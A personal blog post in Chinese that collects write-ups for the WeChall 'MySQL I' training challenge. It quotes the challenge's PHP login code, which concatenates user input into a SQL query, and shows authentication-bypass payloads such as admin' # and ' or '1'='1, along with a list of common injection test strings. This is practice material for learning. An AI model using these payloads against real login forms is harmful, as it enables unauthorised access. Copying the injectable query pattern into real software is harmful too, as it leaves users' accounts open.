---
layout: post
title: "sqli-studying1"
date: 2019-05-15
author: jjnoob
categories:
- 2019-05
tags:
- sqli
---

* content
{:toc}

> sql注入的学习. 看别人的writeup, 积累.


[参考 leehaming](https://blog.csdn.net/lee_ham/article/details/77185049)


# Wechall - Training: MySQL I (MySQL, Exploit, Training)
[题目链接](http://www.wechall.net/challenge/training/mysql/auth_bypass1/index.php)


```
username: admin' or '1'='1
passowrd: anyone
```

# 源码

```sql
/* TABLE STRUCTURE */
CREATE TABLE IF NOT EXISTS users (
userid    INT(11) UNSIGNED AUTO_INCREMENT PRIMARY KEY, 
username  VARCHAR(32) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL,
password  CHAR(32) CHARACTER SET ascii COLLATE ascii_bin NOT NULL
) ENGINE=myISAM;
```
创建一个表users，表的三个列分别为userid，username，password


* `UNSIGNED` 无符号, 非负数, 可以增加数据长度.
* `CHARACTER SET utf8` 设置默认编码为utf8
* `COLLATE utf8_general_ci` 数据库校对规则。该三部分分别为数据库字符集、解释不明白、区分大小写.
* `collate` : 校对集，主要是对字符集之间的比较和排序.

```php
# Username and Password sent?

if ( ('' !== ($username = Common::getPostString('username'))) && (false !== ($password = Common::getPostString('password', false))) ) {
      auth1_onLogin($chall, $username, $password);
}
```
是判断用户名和密码是否已经发送给服务器

* `Common::getPostString`是调用已有函数，功能为从表单中获取字符串信息
* `auth1_onLogin`为下边的自定义函数，功能为验证用户名和密码


```php
/**
 * Get the database for this challenge.
 * @return GDO_Database
 */
function auth1_db()
{
        if (false === ($db = gdo_db_instance('localhost', WCC_AUTH_BYPASS1_USER, WCC_AUTH_BYPASS1_PASS, WCC_AUTH_BYPASS1_DB))) {
                die('Database error 0815_1!');
        }
        $db->setLogging(false);
        $db->setEMailOnError(false);
        return $db;
}
```

获取本题需要的数据库, 即登陆.


```php
/**
* Exploit this!
* @param WC_Challenge $chall
* @param unknown_type $username
* @param unknown_type $password
* @return boolean
*/
function auth1_onLogin(WC_Challenge $chall, $username, $password)
{
      $db = auth1_db();

      $password = md5($password);

      $query = "SELECT * FROM users WHERE username='$username' AND password='$password'";

      if (false === ($result = $db->queryFirst($query))) {
              echo GWF_HTML::error('Auth1', $chall->lang('err_unknown'), false); # Unknown user
              return false;
      }

      # Welcome back!
      echo GWF_HTML::message('Auth1', $chall->lang('msg_welcome_back', htmlspecialchars($result['username'])), false);

      # Challenge solved?
      if (strtolower($result['username']) === 'admin') {
              $chall->onChallengeSolved(GWF_Session::getUserID());
      }

      return true;
}
```


* 这部分就是之前提到的自定义函数，用来处理表单提交的数据。函数与表单之间通过参数`username`和`password`传递数据
* 从html表单中输入的username和password就可以代入到这里的query语句中就可以了。
* 接着`result=result=db->queryFirst($query)`处理MySQL语句并且将结果返回给result，如果查询结果不是false，说明结果存在。
* `$result[‘username’]) === ‘admin’`判断用户是否是admin，如果是说明管理员登录。
* 完成登陆过程。


<br />

# 注入
输入username和password使得执行query语句的结果存在并且用户名为Admin。但是由于我们不知道真实的admin的密码，所以我们想办法绕过password。即我们可以减少select的限制条件，通过将query中AND及其后边的语句在MySQL语句中注释掉，就可以将query改写为：
```sql
SELECT * FROM users WHERE username='admin'
```

单行注释:`#`和`–`

构造过程:
* username为：`admin' #`
* password不填

另外, 这种也是可以的:
```sql
admin' or '1'='1
anyone
```
常见的SQL诸如语句测试:
```sql
' or '1'='1 
' or 1=1 – 
'or'='0' 
"or 1=1 – 
or 1=1 – 
'or' a '=' a 
"or" a "=" a
```

<br />

# Writeup 2


[参考博客园宋姑娘](https://www.cnblogs.com/dreamofus/p/5950844.html)


## 源码
* 判断方式:

```sql
SELECT * FROM users WHERE username='$username' AND password='$password';
```

* 而且有admin这个用户的特判

## 注入:
* 利用php的局部注释“#”可以进行攻击：
* username输入：`admin' and 1=1 #`

这里的代码将被翻译成:
```sql
username='admin' # and  password='$password'"
```
所以密码的验证将被忽略，可以作为admin登录


<br />

# SQL万能密码：`' or 1='1`

[参考friendan](https://blog.csdn.net/friendan/article/details/52215980)

```sql
select name,pass from tbAdmin where name='admin' and pass='123456'
```

输入用户名：`' or 1='1`

SQL变成:
```sql
select name,pass from tbAdmin where name='' or 1='1' and pass='123456'
```

`1='1'` 永远为真，所以就验证通过.
